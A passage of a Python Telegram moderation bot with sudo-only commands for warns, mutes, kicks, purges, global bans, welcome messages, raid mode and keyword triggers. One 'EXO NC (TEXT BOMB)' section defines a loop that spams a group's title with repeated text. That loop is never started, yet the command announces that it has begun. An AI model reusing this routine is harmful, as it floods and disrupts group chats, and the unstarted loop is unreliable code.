                await b.ban_chat_member(gid, target_id)
                success += 1
                break
            except:
                fail += 1
    await status_msg.edit_text(
        "╭━━━━〔 🚫 𝐌𝐀𝐒𝐒 𝐁𝐀𝐍 〕━━━━╮\n"
        "│\n"
        f"│  👤 𝐓𝐚𝐫𝐠𝐞𝐭  : {target_name}\n"
        f"│  ✅ 𝐁𝐚𝐧𝐧𝐞𝐝  : {success} 𝐠𝐫𝐨𝐮𝐩𝐬\n"
        f"│  ❌ 𝐅𝐚𝐢𝐥𝐞𝐝  : {fail} 𝐠𝐫𝐨𝐮𝐩𝐬\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )

# ─────────────────────────────────────────────────
#  WARN SYSTEM
# ─────────────────────────────────────────────────
@only_sudo
async def warn_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐮𝐬𝐞𝐫 𝐭𝐨 𝐰𝐚𝐫𝐧!")
    target = update.message.reply_to_message.from_user
    cid, uid = str(update.message.chat_id), str(target.id)
    reason = " ".join(context.args) if context.args else "𝐍𝐨 𝐫𝐞𝐚𝐬𝐨𝐧 𝐠𝐢𝐯𝐞𝐧"
    if cid not in warns_store:
        warns_store[cid] = {}
    warns_store[cid][uid] = warns_store[cid].get(uid, 0) + 1
    count = warns_store[cid][uid]
    save_warns()
    name = target.first_name or target.username or str(target.id)
    if count >= MAX_WARNS:
        try:
            await context.bot.ban_chat_member(update.message.chat_id, target.id)
            warns_store[cid][uid] = 0
            save_warns()
            await update.message.reply_text(
                f"🔨 𝐀𝐔𝐓𝐎-𝐁𝐀𝐍!\n\n"
                f"👤 𝐔𝐬𝐞𝐫: {name}\n"
                f"💀 𝐑𝐞𝐚𝐜𝐡𝐞𝐝 {MAX_WARNS}/{MAX_WARNS} 𝐰𝐚𝐫𝐧𝐬 → 𝐁𝐀𝐍𝐍𝐄𝐃!"
            )
        except:
            await update.message.reply_text(f"⚠️ {name} — {count}/{MAX_WARNS} 𝐰𝐚𝐫𝐧𝐬 (𝐛𝐚𝐧 𝐟𝐚𝐢𝐥𝐞𝐝)")
    else:
        await update.message.reply_text(
            "╭━━━━〔 ⚠️ 𝐖𝐀𝐑𝐍𝐄𝐃 〕━━━━╮\n"
            "│\n"
            f"│  👤 𝐔𝐬𝐞𝐫    : {name}\n"
            f"│  📝 𝐑𝐞𝐚𝐬𝐨𝐧  : {reason}\n"
            f"│  🔢 𝐖𝐚𝐫𝐧𝐬   : {count}/{MAX_WARNS}\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━╯"
        )

@only_sudo
async def warns_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐰𝐚𝐫𝐧𝐬!")
    target = update.message.reply_to_message.from_user
    cid, uid = str(update.message.chat_id), str(target.id)
    count = warns_store.get(cid, {}).get(uid, 0)
    name = target.first_name or str(target.id)
    await update.message.reply_text(
        f"📊 𝐖𝐚𝐫𝐧𝐬 𝐟𝐨𝐫 {name}: {count}/{MAX_WARNS}"
    )

@only_sudo
async def unwarn_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞 𝐰𝐚𝐫𝐧!")
    target = update.message.reply_to_message.from_user
    cid, uid = str(update.message.chat_id), str(target.id)
    cur = warns_store.get(cid, {}).get(uid, 0)
    if cur > 0:
        warns_store.setdefault(cid, {})[uid] = cur - 1
        save_warns()
        name = target.first_name or str(target.id)
        await update.message.reply_text(
            f"✅ 𝐖𝐚𝐫𝐧 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 𝐟𝐫𝐨𝐦 {name}. "
            f"𝐍𝐨𝐰: {cur - 1}/{MAX_WARNS}"
        )
    else:
        await update.message.reply_text("ℹ️ 𝐔𝐬𝐞𝐫 𝐡𝐚𝐬 𝐧𝐨 𝐰𝐚𝐫𝐧𝐬.")

# ─────────────────────────────────────────────────
#  MUTE / UNMUTE / KICK
# ─────────────────────────────────────────────────
@only_sudo
async def mute_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐮𝐬𝐞𝐫 𝐭𝐨 𝐦𝐮𝐭𝐞!")
    from telegram import ChatPermissions
    target = update.message.reply_to_message.from_user
    duration = 3600
    if context.args:
        try:
            duration = int(context.args[0]) * 60
        except: pass
    try:
        until = int(time.time()) + duration
        await context.bot.restrict_chat_member(
            update.message.chat_id, target.id,
            ChatPermissions(can_send_messages=False),
            until_date=until
        )
        mins = duration // 60
        name = target.first_name or str(target.id)
        await update.message.reply_text(
            f"🔇 𝐌𝐔𝐓𝐄𝐃: {name}\n"
            f"⏱️ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {mins} 𝐦𝐢𝐧𝐮𝐭𝐞𝐬"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ 𝐅𝐚𝐢𝐥𝐞𝐝: {e}")

@only_sudo
async def unmute_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐮𝐬𝐞𝐫 𝐭𝐨 𝐮𝐧𝐦𝐮𝐭𝐞!")
    from telegram import ChatPermissions
    target = update.message.reply_to_message.from_user
    try:
        await context.bot.restrict_chat_member(
            update.message.chat_id, target.id,
            ChatPermissions(
                can_send_messages=True,
                can_send_media_messages=True,
                can_send_polls=True,
                can_send_other_messages=True,
                can_add_web_page_previews=True,
            )
        )
        name = target.first_name or str(target.id)
        await update.message.reply_text(f"🔊 𝐔𝐍𝐌𝐔𝐓𝐄𝐃: {name}")
    except Exception as e:
        await update.message.reply_text(f"❌ 𝐅𝐚𝐢𝐥𝐞𝐝: {e}")

@only_sudo
async def kick_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐮𝐬𝐞𝐫 𝐭𝐨 𝐤𝐢𝐜𝐤!")
    target = update.message.reply_to_message.from_user
    try:
        await context.bot.ban_chat_member(update.message.chat_id, target.id)
        await asyncio.sleep(0.5)
        await context.bot.unban_chat_member(update.message.chat_id, target.id)
        name = target.first_name or str(target.id)
        await update.message.reply_text(f"👢 𝐊𝐈𝐂𝐊𝐄𝐃: {name}!")
    except Exception as e:
        await update.message.reply_text(f"❌ 𝐅𝐚𝐢𝐥𝐞𝐝: {e}")

# ─────────────────────────────────────────────────
#  USER INFO
# ─────────────────────────────────────────────────
@only_sudo
async def info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        user = update.message.reply_to_message.from_user
    elif context.args:
        try:
            chat = await context.bot.get_chat(int(context.args[0]))
            user = chat
        except:
            return await update.message.reply_text("⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐔𝐬𝐞𝐫 𝐈𝐃.")
    else:
        user = update.effective_user
    uid = user.id
    first = getattr(user, "first_name", "") or ""
    last = getattr(user, "last_name", "") or ""
    name = f"{first} {last}".strip() or str(uid)
    username = f"@{user.username}" if user.username else "𝐍𝐨𝐧𝐞"
    is_bot = getattr(user, "is_bot", False)
    try:
        member = await context.bot.get_chat_member(update.message.chat_id, uid)
        status = member.status
    except:
        status = "𝐮𝐧𝐤𝐧𝐨𝐰𝐧"
    sudo_str = "✅ 𝐘𝐄𝐒" if uid in SUDO_USERS else "❌ 𝐍𝐎"
    owner_str = "✅ 𝐘𝐄𝐒" if uid in OWNER_IDS else "❌ 𝐍𝐎"
    warns_count = warns_store.get(str(update.message.chat_id), {}).get(str(uid), 0)
    await update.message.reply_text(
        "╭━━━━〔 👤 𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎 〕━━━━╮\n"
        "│\n"
        f"│  🆔 𝐈𝐃      : {uid}\n"
        f"│  👤 𝐍𝐚𝐦𝐞    : {name}\n"
        f"│  📛 𝐔𝐬𝐞𝐫    : {username}\n"
        f"│  🔖 𝐒𝐭𝐚𝐭𝐮𝐬  : {status}\n"
        f"│  🤖 𝐁𝐨𝐭     : {'✅' if is_bot else '❌'}\n"
        f"│  👑 𝐎𝐰𝐧𝐞𝐫   : {owner_str}\n"
        f"│  ⚡ 𝐒𝐮𝐝𝐨    : {sudo_str}\n"
        f"│  ⚠️ 𝐖𝐚𝐫𝐧𝐬   : {warns_count}/{MAX_WARNS}\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )

# ─────────────────────────────────────────────────
#  PURGE
# ─────────────────────────────────────────────────
@only_sudo
async def purge_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    n = 10
    if context.args:
        try:
            n = max(1, min(int(context.args[0]), 100))
        except: pass
    msg_id = update.message.message_id
    deleted = 0
    for mid in range(msg_id - n, msg_id + 1):
        try:
            await context.bot.delete_message(update.message.chat_id, mid)
            deleted += 1
        except: pass
    notice = await context.bot.send_message(
        update.message.chat_id,
        f"🗑️ 𝐏𝐔𝐑𝐆𝐄𝐃 {deleted} 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬! ✅"
    )
    await asyncio.sleep(3)
    try:
        await notice.delete()
    except: pass

# ─────────────────────────────────────────────────
#  PIN / UNPIN
# ─────────────────────────────────────────────────
@only_sudo
async def pin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨 𝐩𝐢𝐧!")
    try:
        await context.bot.pin_chat_message(
            update.message.chat_id,
            update.message.reply_to_message.message_id,
            disable_notification=False
        )
        await update.message.reply_text("📌 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐩𝐢𝐧𝐧𝐞𝐝! ✅")
    except Exception as e:
        await update.message.reply_text(f"❌ 𝐅𝐚𝐢𝐥𝐞𝐝: {e}")

@only_sudo
async def unpin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.unpin_all_chat_messages(update.message.chat_id)
        await update.message.reply_text("📌 𝐀𝐥𝐥 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐮𝐧𝐩𝐢𝐧𝐧𝐞𝐝! ✅")
    except Exception as e:
        await update.message.reply_text(f"❌ 𝐅𝐚𝐢𝐥𝐞𝐝: {e}")

# ─────────────────────────────────────────────────
#  TAG ALL (SEEN USERS)
# ─────────────────────────────────────────────────
@only_sudo
async def tagall_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    cid_str = str(cid)
    msg_text = " ".join(context.args) if context.args else "👋 𝐀𝐓𝐓𝐄𝐍𝐓𝐈𝐎𝐍 𝐄𝐕𝐄𝐑𝐘𝐎𝐍𝐄!"
    users = seen_users.get(cid_str, {})
    if not users:
        return await update.message.reply_text(
            "⚠️ 𝐍𝐨 𝐮𝐬𝐞𝐫𝐬 𝐭𝐫𝐚𝐜𝐤𝐞𝐝 𝐲𝐞𝐭.\n"
            "𝐖𝐚𝐢𝐭 𝐟𝐨𝐫 𝐦𝐞𝐦𝐛𝐞𝐫𝐬 𝐭𝐨 𝐬𝐞𝐧𝐝 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐟𝐢𝐫𝐬𝐭."
        )
    chunk = []
    count = 0
    for uid_str, udata in users.items():
        name = udata.get("name", uid_str)
        chunk.append(f"[{name}](tg://user?id={uid_str})")
        count += 1
        if len(chunk) >= 5:
            await update.message.reply_text(
                msg_text + "\n" + " • ".join(chunk),
                parse_mode="Markdown"
            )
            chunk = []
            await asyncio.sleep(1)
    if chunk:
        await update.message.reply_text(
            msg_text + "\n" + " • ".join(chunk),
            parse_mode="Markdown"
        )
    await update.message.reply_text(f"✅ 𝐓𝐚𝐠𝐠𝐞𝐝 {count} 𝐮𝐬𝐞𝐫𝐬!")

# ─────────────────────────────────────────────────
#  EXO NC (TEXT BOMB)
# ─────────────────────────────────────────────────
@only_sudo
async def exonc_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid in group_tasks:
        for t in group_tasks[cid]: t.cancel()
    base = " ".join(context.args) if context.args else ALL_NC_TEXT
    async def _exo_loop(bot, c, b):
        while True:
            try:
                combo = random.choice(EXONC_TEXTS) * random.randint(3, 8)
                await bot.set_chat_title(c, f"{b} {combo}")
                await asyncio.sleep(global_delay)
            except Exception:
                pass
            except asyncio.CancelledError:
                break
            except:
                await asyncio.sleep(1)
    await update.message.reply_text("⚡ 𝐄𝐗𝐎 𝐍𝐂 𝐁𝐎𝐌𝐁 𝐒𝐓𝐀𝐑𝐓𝐄𝐃! /stopnc 𝐭𝐨 𝐬𝐭𝐨𝐩")

# ─────────────────────────────────────────────────
#  NOTES SYSTEM
# ─────────────────────────────────────────────────
@only_sudo
async def note_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /note <key> <text>")
    key = context.args[0].lower()
    text = " ".join(context.args[1:])
    notes_store[key] = text
    save_notes()
    await update.message.reply_text(f"✅ 𝐍𝐨𝐭𝐞 '𝐬𝐚𝐯𝐞𝐝: [{key}]")

@only_sudo
async def getnote_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /getnote <key>")
    key = context.args[0].lower()
    if key not in notes_store:
        return await update.message.reply_text(f"❌ 𝐍𝐨 𝐧𝐨𝐭𝐞 𝐟𝐨𝐮𝐧𝐝 𝐟𝐨𝐫 '[{key}]'")
    await update.message.reply_text(
        f"╭━━━━〔 📝 𝐍𝐎𝐓𝐄: {key} 〕━━━━╮\n"
        f"│\n"
        f"│  {notes_store[key]}\n"
        f"│\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )

@only_sudo
async def notes_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not notes_store:
        return await update.message.reply_text("📝 𝐍𝐨 𝐧𝐨𝐭𝐞𝐬 𝐬𝐚𝐯𝐞𝐝 𝐲𝐞𝐭.")
    lines = []
    for i, (k, v) in enumerate(notes_store.items(), 1):
        preview = v[:50] + ("..." if len(v) > 50 else "")
        lines.append(f"  {i}. [{k}] — {preview}")
    await update.message.reply_text(
        "╭━━━━〔 📝 𝐀𝐋𝐋 𝐍𝐎𝐓𝐄𝐒 〕━━━━╮\n"
        "│\n" +
        "\n".join(lines) + "\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )

@only_sudo
async def delnote_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /delnote <key>")
    key = context.args[0].lower()
    if key in notes_store:
        del notes_store[key]
        save_notes()
        await update.message.reply_text(f"✅ 𝐍𝐨𝐭𝐞 '[{key}]' 𝐝𝐞𝐥𝐞𝐭𝐞𝐝!")
    else:
        await update.message.reply_text(f"❌ 𝐍𝐨𝐭𝐞 '[{key}]' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.")

# ─────────────────────────────────────────────────
#  GBAN SYSTEM
# ─────────────────────────────────────────────────
def load_gbans():
    global gban_users
    if os.path.exists(GBAN_FILE):
        try:
            with open(GBAN_FILE) as f:
                gban_users = set(json.load(f))
        except: gban_users = set()

def save_gbans():
    with open(GBAN_FILE, "w") as f:
        json.dump(list(gban_users), f)

@only_sudo
async def gban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message and not context.args:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐮𝐬𝐞𝐫 𝐨𝐫 𝐩𝐚𝐬𝐬 𝐈𝐃")
    if update.message.reply_to_message:
        target = update.message.reply_to_message.from_user
        uid = target.id
        name = target.first_name or str(uid)
    else:
        try:
            uid = int(context.args[0])
            name = str(uid)
        except:
            return await update.message.reply_text("⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐃")
    if uid in OWNER_IDS:
        return await update.message.reply_text("❌ 𝐂𝐚𝐧𝐧𝐨𝐭 𝐆𝐛𝐚𝐧 𝐎𝐰𝐧𝐞𝐫!")
    gban_users.add(uid)
    save_gbans()
    reason = " ".join(context.args[1:] if update.message.reply_to_message else context.args[1:]) or "𝐍𝐨 𝐫𝐞𝐚𝐬𝐨𝐧"
    # Ban from all groups
    if os.path.exists(GROUPS_FILE):
        try:
            with open(GROUPS_FILE) as f: groups = json.load(f)
        except: groups = []
    else: groups = []
    banned = 0
    for gid in groups:
        try:
            await context.bot.ban_chat_member(gid, uid)
            banned += 1
        except: pass
    await update.message.reply_text(
        "╭━━━━〔 🌍 𝐆𝐋𝐎𝐁𝐀𝐋 𝐁𝐀𝐍 〕━━━━╮\n"
        "│\n"
        f"│  👤 𝐔𝐬𝐞𝐫  : {name}\n"
        f"│  🆔 𝐈𝐃    : {uid}\n"
        f"│  📝 𝐑𝐞𝐚𝐬𝐨𝐧: {reason}\n"
        f"│  🔨 𝐆𝐫𝐨𝐮𝐩𝐬: {banned} 𝐛𝐚𝐧𝐧𝐞𝐝\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )

@only_sudo
async def ungban_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.reply_to_message:
        uid = update.message.reply_to_message.from_user.id
        name = update.message.reply_to_message.from_user.first_name or str(uid)
    elif context.args:
        try:
            uid = int(context.args[0])
            name = str(uid)
        except:
            return await update.message.reply_text("⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐃")
    else:
        return await update.message.reply_text("⚠️ 𝐑𝐞𝐩𝐥𝐲 𝐨𝐫 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐈𝐃")
    gban_users.discard(uid)
    save_gbans()
    if os.path.exists(GROUPS_FILE):
        try:
            with open(GROUPS_FILE) as f: groups = json.load(f)
        except: groups = []
    else: groups = []
    for gid in groups:
        try:
            await context.bot.unban_chat_member(gid, uid)
        except: pass
    await update.message.reply_text(f"✅ 𝐆𝐋𝐎𝐁𝐀𝐋 𝐔𝐍𝐁𝐀𝐍𝐍𝐄𝐃: {name}")

# ─────────────────────────────────────────────────
#  WELCOME SYSTEM
# ─────────────────────────────────────────────────
@only_sudo
async def setwelcome_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text(
            "⚠️ 𝐔𝐬𝐚𝐠𝐞: /setwelcome <text>\n"
            "𝐕𝐚𝐫𝐢𝐚𝐛𝐥𝐞𝐬: {name} {mention} {count} {chat}"
        )
    cid = update.message.chat_id
    text = " ".join(context.args)
    welcome_messages[cid] = text
    welcome_chats.add(cid)
    await update.message.reply_text(
        f"✅ 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐒𝐄𝐓!\n\n𝐏𝐫𝐞𝐯𝐢𝐞𝐰:\n{text}"
    )

@only_sudo
async def delwelcome_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    welcome_chats.discard(cid)
    welcome_messages.pop(cid, None)
    await update.message.reply_text("❌ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐫𝐞𝐦𝐨𝐯𝐞𝐝.")

async def welcome_new_member(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    if cid not in welcome_chats:
        return
    for member in (update.message.new_chat_members or []):
        if member.is_bot:
            continue
        name = member.first_name or str(member.id)
        mention = f"[{name}](tg://user?id={member.id})"
        try:
            chat = await context.bot.get_chat(cid)
            count = chat.member_count
        except:
            count = "?"
        chat_title = update.message.chat.title or "this group"
        tmpl = welcome_messages.get(cid, "🎉 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 {mention} 𝐭𝐨 {chat}!")
        text = (tmpl
            .replace("{name}", name)
            .replace("{mention}", mention)
            .replace("{count}", str(count))
            .replace("{chat}", chat_title))
        try:
            await context.bot.send_message(cid, text, parse_mode="Markdown")
        except:
            try:
                await context.bot.send_message(cid, text)
            except: pass

# ─────────────────────────────────────────────────
#  ANTI-LINK
# ─────────────────────────────────────────────────
@only_sudo
async def antilink_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    arg = context.args[0].lower() if context.args else ""
    if arg == "on":
        antilink_chats.add(cid)
        await update.message.reply_text("🔗 𝐀𝐍𝐓𝐈-𝐋𝐈𝐍𝐊 𝐎𝐍 ✅\n𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐥𝐢𝐧𝐤𝐬 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐚𝐮𝐭𝐨-𝐝𝐞𝐥𝐞𝐭𝐞𝐝.")
    elif arg == "off":
        antilink_chats.discard(cid)
        await update.message.reply_text("🔗 𝐀𝐍𝐓𝐈-𝐋𝐈𝐍𝐊 𝐎𝐅𝐅 ❌")
    else:
        s = "🟢 ON" if cid in antilink_chats else "🔴 OFF"
        await update.message.reply_text(f"⚠️ /antilink on|off\n📊 {s}")

# ─────────────────────────────────────────────────
#  ANTI-FORWARD
# ─────────────────────────────────────────────────
@only_sudo
async def antiforward_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    arg = context.args[0].lower() if context.args else ""
    if arg == "on":
        antiforward_chats.add(cid)
        await update.message.reply_text("🔁 𝐀𝐍𝐓𝐈-𝐅𝐎𝐑𝐖𝐀𝐑𝐃 𝐎𝐍 ✅\n𝐅𝐨𝐫𝐰𝐚𝐫𝐝𝐞𝐝 𝐦𝐬𝐠𝐬 𝐝𝐞𝐥𝐞𝐭𝐞𝐝.")
    elif arg == "off":
        antiforward_chats.discard(cid)
        await update.message.reply_text("🔁 𝐀𝐍𝐓𝐈-𝐅𝐎𝐑𝐖𝐀𝐑𝐃 𝐎𝐅𝐅 ❌")
    else:
        s = "🟢 ON" if cid in antiforward_chats else "🔴 OFF"
        await update.message.reply_text(f"⚠️ /antiforward on|off\n📊 {s}")

# ─────────────────────────────────────────────────
#  RAID MODE
# ─────────────────────────────────────────────────
@only_sudo
async def raidmode_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    from telegram import ChatPermissions
    cid = update.message.chat_id
    arg = context.args[0].lower() if context.args else ""
    if arg == "on":
        raidmode_chats.add(cid)
        try:
            await context.bot.set_chat_permissions(cid, ChatPermissions(can_send_messages=False))
        except: pass
        await update.message.reply_text(
            "⚡ 𝐑𝐀𝐈𝐃 𝐌𝐎𝐃𝐄 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃! 🔒\n"
            "𝐀𝐥𝐥 𝐧𝐨𝐧-𝐚𝐝𝐦𝐢𝐧𝐬 𝐦𝐮𝐭𝐞𝐝.\n"
            "𝐔𝐬𝐞 /raidmode off 𝐭𝐨 𝐮𝐧𝐥𝐨𝐜𝐤."
        )
    elif arg == "off":
        raidmode_chats.discard(cid)
        try:
            await context.bot.set_chat_permissions(cid, ChatPermissions(
                can_send_messages=True,
                can_send_media_messages=True,
                can_send_polls=True,
                can_send_other_messages=True,
                can_add_web_page_previews=True,
            ))
        except: pass
        await update.message.reply_text("⚡ 𝐑𝐀𝐈𝐃 𝐌𝐎𝐃𝐄 𝐎𝐅𝐅 ✅ 𝐆𝐫𝐨𝐮𝐩 𝐮𝐧𝐥𝐨𝐜𝐤𝐞𝐝.")
    else:
        s = "🔴 ACTIVE" if cid in raidmode_chats else "🟢 OFF"
        await update.message.reply_text(f"⚠️ /raidmode on|off\n📊 {s}")

# ─────────────────────────────────────────────────
#  LOCK / UNLOCK
# ─────────────────────────────────────────────────
@only_sudo
async def lock_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    from telegram import ChatPermissions
    cid = update.message.chat_id
    locked_chats.add(cid)
    try:
        await context.bot.set_chat_permissions(cid, ChatPermissions(can_send_messages=False))
    except: pass
    await update.message.reply_text(
        "🔒 𝐆𝐑𝐎𝐔𝐏 𝐋𝐎𝐂𝐊𝐄𝐃!\n"
        "𝐎𝐧𝐥𝐲 𝐚𝐝𝐦𝐢𝐧𝐬 𝐜𝐚𝐧 𝐬𝐞𝐧𝐝 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬.\n"
        "𝐔𝐬𝐞 /unlock 𝐭𝐨 𝐨𝐩𝐞𝐧."
    )

@only_sudo
async def unlock_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    from telegram import ChatPermissions
    cid = update.message.chat_id
    locked_chats.discard(cid)
    try:
        await context.bot.set_chat_permissions(cid, ChatPermissions(
            can_send_messages=True,
            can_send_media_messages=True,
            can_send_polls=True,
            can_send_other_messages=True,
            can_add_web_page_previews=True,
        ))
    except: pass
    await update.message.reply_text("🔓 𝐆𝐑𝐎𝐔𝐏 𝐔𝐍𝐋𝐎𝐂𝐊𝐄𝐃! 𝐄𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐜𝐚𝐧 𝐜𝐡𝐚𝐭. ✅")

# ─────────────────────────────────────────────────
#  AUTO-TRIGGER (CUSTOM KEYWORD → AUTO REPLY)
# ─────────────────────────────────────────────────
@only_sudo
async def addtrigger_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        return await update.message.reply_text(
            "⚠️ 𝐔𝐬𝐚𝐠𝐞: /addtrigger <keyword> <reply>\n"
            "𝐄𝐱: /addtrigger hello Hi there!"
        )
    cid = update.message.chat_id
    keyword = context.args[0].lower()
    reply_text = " ".join(context.args[1:])
    triggers.setdefault(cid, {})[keyword] = reply_text
    await update.message.reply_text(
        f"✅ 𝐓𝐑𝐈𝐆𝐆𝐄𝐑 𝐀𝐃𝐃𝐄𝐃!\n"
        f"🔑 𝐊𝐞𝐲𝐰𝐨𝐫𝐝: [{keyword}]\n"
        f"💬 𝐑𝐞𝐩𝐥𝐲: {reply_text}"
    )

@only_sudo
async def deltrigger_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("⚠️ 𝐔𝐬𝐚𝐠𝐞: /deltrigger <keyword>")
    cid = update.message.chat_id
    keyword = context.args[0].lower()
    if cid in triggers and keyword in triggers[cid]:
        del triggers[cid][keyword]
        await update.message.reply_text(f"🗑️ 𝐓𝐫𝐢𝐠𝐠𝐞𝐫 [{keyword}] 𝐝𝐞𝐥𝐞𝐭𝐞𝐝.")
    else:
        await update.message.reply_text(f"❌ 𝐓𝐫𝐢𝐠𝐠𝐞𝐫 [{keyword}] 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.")

@only_sudo
async def triggers_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    t = triggers.get(cid, {})
    if not t:
        return await update.message.reply_text("📋 𝐍𝐨 𝐭𝐫𝐢𝐠𝐠𝐞𝐫𝐬 𝐬𝐞𝐭.")
    lines = [f"  🔑 [{k}] → {v}" for k, v in t.items()]
    await update.message.reply_text(
        "╭━━━━〔 💬 𝐓𝐑𝐈𝐆𝐆𝐄𝐑𝐒 〕━━━━╮\n│\n" +
        "\n".join(lines) +
        "\n│\n╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )

# ─────────────────────────────────────────────────
#  TOP CHATTERS / LEADERBOARD
# ─────────────────────────────────────────────────
async def topchat_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.message.chat_id
    data = chat_stats.get(cid, {})
    if not data:
        return await update.message.reply_text("📊 𝐍𝐨 𝐬𝐭𝐚𝐭𝐬 𝐲𝐞𝐭. 𝐒𝐭𝐚𝐫𝐭 𝐜𝐡𝐚𝐭𝐭𝐢𝐧𝐠!")
    sorted_data = sorted(data.items(), key=lambda x: x[1], reverse=True)[:10]
    medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"]
    lines = []
    for i, (uid_str, count) in enumerate(sorted_data):
        medal = medals[i] if i < len(medals) else f"{i+1}."
        name = uid_str
        try:
            member = await context.bot.get_chat_member(cid, int(uid_str))
            name = member.user.first_name or uid_str
        except: pass
        lines.append(f"│  {medal} {name} — {count} 𝐦𝐬𝐠𝐬")
    await update.message.reply_text(
        "╭━━━━〔 📊 𝐓𝐎𝐏 𝐂𝐇𝐀𝐓𝐓𝐄𝐑𝐒 〕━━━━╮\n│\n" +
        "\n".join(lines) +
        "\n│\n╰━━━━━━━━━━━━━━━━━━━━━━╯"
    )

# ─────────────────────────────────────────────────
#  REPORT TO ADMINS
# ─────────────────────────────────────────────────
async def report_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message:
